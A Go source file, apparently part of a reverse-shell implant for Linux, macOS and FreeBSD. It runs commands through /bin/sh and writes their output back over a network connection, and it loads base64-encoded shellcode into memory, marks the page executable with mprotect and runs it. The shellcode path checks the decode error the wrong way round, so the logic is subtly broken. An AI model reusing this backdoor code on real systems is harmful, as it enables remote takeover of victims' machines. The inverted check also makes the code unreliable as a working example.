// +build linux darwin freebsd !windows

package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

var connectString string

// GetShell returns a shell command
func GetShell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

// ExecuteCmd executes a given command
func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

// InjectShellcode decodes base64 encoded shellcode and inject it in the same process
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err != nil {
			go ExecShellcode(shellcode)
		}
	}
}

// Get the page containing the given pointer and return as a byte slice
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}

// ExecShellcode sets the memory page containing the shellcode to R-X, then execute shellcode as a function
func ExecShellcode(shellcode []byte) {
	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
	page := getPage(shellcodeAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	shellPtr := unsafe.Pointer(&shellcode)
	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
	go shellcodeFuncPtr()
}
